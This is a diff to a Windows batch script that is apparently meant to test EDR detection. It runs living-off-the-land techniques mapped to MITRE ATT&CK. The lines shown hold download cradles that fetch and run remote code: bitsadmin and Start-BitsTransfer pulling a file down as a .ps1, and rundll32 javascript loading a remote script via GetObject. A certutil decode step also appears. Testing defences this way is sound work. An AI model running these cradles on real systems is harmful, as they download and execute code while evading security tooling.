@@ -2,7 +2,7 @@ REM Source of inspiration: https://github.com/api0cradle/LOLBAS/tree/master/OSBi
 REM Source of inspiration: https://attack.mitre.org/wiki/Main_Page
 REM Author: op7ic
 REM Description: Test the detection of various scripts/downloads/execs against your EDR solution.
-REM Warning: You might have to click on few windows to close script execution. Don't run this on live system instead run this in a VM !
+REM Warning: You might have to click on few windows to close script execution. Don't run this on live system instead run this in a VM with EDR installed!
 REM Version: 0.3a
 
 
@@ -86,7 +86,7 @@ echo Command Excuted: certutil -f -decode fi.b64 AllTheThings.dll
 timeout 2
 
 echo %time% %date% [+] T1197 - Testing bitsadmin download
-start "" cmd /c bitsadmin.exe /transfer /Download https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path.ps1
+start "" cmd /c bitsadmin.exe /transfer "JobName" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt "%cd%\Default_File_Path.ps1"
 echo Execution Finished at %time% %date%
 echo Command Excuted: bitsadmin.exe /transfer /Download https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path.ps1
 start "" cmd /c powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
@@ -218,6 +218,7 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
 
 timeout 2
+
 echo %time% %date% [+] T1085 - Testing rundll32 exec
 start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
 echo Execution Finished at %time% %date%
